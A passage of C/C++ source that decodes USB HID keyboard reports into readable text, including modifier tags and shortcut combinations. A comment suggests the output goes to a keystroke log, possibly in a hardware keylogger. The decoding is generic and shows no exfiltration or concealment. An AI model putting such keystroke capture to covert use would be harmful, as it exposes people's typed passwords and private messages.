    keyName[0] = NUM_NORMAL[code - 0x1E];
    keyName[1] = '\0';
  } else if (code >= 0x2D && code <= 0x38) {
    keyName[0] = PUNCT[code - 0x2D].normal;
    keyName[1] = '\0';
  } else if (code >= 0x54 && code <= 0x63) {
    if (code == 0x58) strcpy(keyName, "Enter");
    else {
      char c = KEYPAD[code - 0x54];
      if (c != '\0') {
        keyName[0] = c;
        keyName[1] = '\0';
      }
    }
  } else {
    const char* special = shortcutSpecialName(code);
    if (special) strncpy(keyName, special, sizeof(keyName) - 1);
  }
  if (keyName[0] == '\0') return;

  // BUG-3 fix: build the complete "[Ctrl+Alt+key]" string in a local buffer
  // first, then append it atomically to dst.  The previous approach wrote
  // each piece separately; if the dst buffer ran out mid-way the opening "["
  // could be written without the closing "]", leaving a lone "[" in the log.
  // Max combo length: "[" + "Ctrl+" + "Alt+" + "Shift+" + "Win+" + 11-char key + "]" = 32 bytes.
  char combo[32] = "[";
  size_t cl = 1;
  auto catCombo = [&](const char* s) {
    size_t sl = strlen(s);
    if (cl + sl < sizeof(combo)) { memcpy(combo + cl, s, sl); cl += sl; }
  };
  if (hidCtrlDown(report))  catCombo("Ctrl+");
  if (hidAltDown(report))   catCombo("Alt+");
  if (hidShiftDown(report)) catCombo("Shift+");
  if (hidWinDown(report))   catCombo("Win+");
  catCombo(keyName);
  if (cl < sizeof(combo) - 1) { combo[cl++] = ']'; }
  combo[cl] = '\0';
  appendStr(dst, cap, combo);
}

void HID2ASCII(uint8_t* HIDData_old, uint8_t* HIDData, bool capslock,
               char* result, size_t resultSize) {
  bool shift = hidShiftDown(HIDData);
  bool shortcutMode = hidAltDown(HIDData) || hidWinDown(HIDData);

  // Modifier rising-edge detection
  if ((!GET_BIT(HIDData_old[0],0) && GET_BIT(HIDData[0],0)) ||
      (!GET_BIT(HIDData_old[0],4) && GET_BIT(HIDData[0],4)))
    appendStr(result, resultSize, "[Ctrl]");
  if ((!GET_BIT(HIDData_old[0],1) && GET_BIT(HIDData[0],1)) ||
      (!GET_BIT(HIDData_old[0],5) && GET_BIT(HIDData[0],5)))
    appendStr(result, resultSize, "[Shift]");
  if ((!GET_BIT(HIDData_old[0],2) && GET_BIT(HIDData[0],2)) ||
      (!GET_BIT(HIDData_old[0],6) && GET_BIT(HIDData[0],6)))
    appendStr(result, resultSize, "[Alt]");
  if ((!GET_BIT(HIDData_old[0],3) && GET_BIT(HIDData[0],3)) ||
      (!GET_BIT(HIDData_old[0],7) && GET_BIT(HIDData[0],7)))
    appendStr(result, resultSize, "[Win]");

  for (int i = 2; i < 8; i++) {
    uint8_t code = HIDData[i];
    if (code == 0x00) continue;

    // Suppress keys already held in any previous slot; reports may reorder
    // held keys, so comparing only the same slot can duplicate characters.
    if (hidReportHasKey(HIDData_old, code)) continue;

    if (shortcutMode) {
      appendShortcutKey(result, resultSize, HIDData, code);
      continue;
    }

    // a..z (0x04..0x1D): capslock XOR shift toggles case
    if (code >= 0x04 && code <= 0x1D) {
      bool upper = capslock != shift;
      appendChar(result, resultSize,
                 (char)((upper ? 'A' : 'a') + (code - 0x04)));
      continue;
    }
    // 1..0 (0x1E..0x27)
    if (code >= 0x1E && code <= 0x27) {
      appendChar(result, resultSize,
                 shift ? NUM_SHIFT[code - 0x1E] : NUM_NORMAL[code - 0x1E]);
      continue;
    }
    // Punctuation (0x2D..0x38)
    if (code >= 0x2D && code <= 0x38) {
      const PunctMap& p = PUNCT[code - 0x2D];
      appendChar(result, resultSize, shift ? p.shifted : p.normal);
      continue;
    }
    // Keypad characters (0x54..0x63), with 0x58 mapped to Enter
    if (code >= 0x54 && code <= 0x63) {
      if (code == 0x58) { appendStr(result, resultSize, "[Enter]\n"); continue; }
      char c = KEYPAD[code - 0x54];
      if (c != '\0') appendChar(result, resultSize, c);
      continue;
    }
    // Named keys (Enter, Esc, F1.., arrows, etc.)
    const char* name = specialKeyName(code);
    if (name) appendStr(result, resultSize, name);
  }
}
